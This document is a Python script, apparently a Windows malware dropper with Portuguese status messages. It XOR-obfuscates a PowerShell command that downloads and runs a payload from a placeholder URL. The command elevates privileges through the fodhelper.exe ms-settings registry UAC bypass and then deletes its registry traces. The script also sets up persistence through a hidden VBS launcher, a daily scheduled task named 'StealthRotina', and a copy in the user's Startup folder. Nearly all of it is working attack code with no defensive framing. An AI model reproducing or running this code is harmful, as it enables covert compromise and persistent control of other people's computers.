import os
import getpass
import shutil

def xor_encode(data, key):
    return ''.join(chr(ord(c) ^ key) for c in data)

def generate_executor_script(encoded_command, key):
    ps_script = f"""
$key = {key}
$data = '{encoded_command}'
$decoded = -join ($data.ToCharArray() | ForEach-Object {{[char]([int]$_ -bxor $key)}})
Invoke-Expression $decoded
"""
    return ps_script.strip()

payload_url = "<URL_DO_PAYLOAD>"
bypass_command = f'''
$payload = "$env:TEMP\\payload.exe"
Invoke-WebRequest -Uri "{payload_url}" -OutFile $payload

$regPath = "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command"
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path $regPath -Name "(default)" -Value "$payload" -Force

Start-Process "fodhelper.exe"

Start-Sleep -Seconds 5
Remove-Item -Path $regPath -Recurse -Force
'''

key = 23
encoded = xor_encode(bypass_command, key)
executor_script = generate_executor_script(encoded, key)

script_dir = "C:\\Scripts"
script_path = os.path.join(script_dir, "runme.ps1")
os.makedirs(script_dir, exist_ok=True)
with open(script_path, "w", encoding="utf-8") as f:
    f.write(executor_script)

vbs_launcher = f'''
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File ""{script_path}""", 0, False
'''.strip()

vbs_path = os.path.join(script_dir, "launch.vbs")
with open(vbs_path, "w", encoding="utf-8") as f:
    f.write(vbs_launcher)

task_name = "StealthRotina"
os.system(f'schtasks /create /tn "{task_name}" /tr "wscript.exe {vbs_path}" /sc daily /st 10:00 /f')

user = getpass.getuser()
startup_path = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
shutil.copy(vbs_path, os.path.join(startup_path, "launch.vbs"))

print(f"[✔] Script PowerShell salvo em: {script_path}")
print(f"[✔] VBS launcher salvo em: {vbs_path}")
print(f"[✔] Tarefa agendada invisível criada: {task_name}")
print(f"[✔] VBS copiado para Startup: {startup_path}\\launch.vbs")
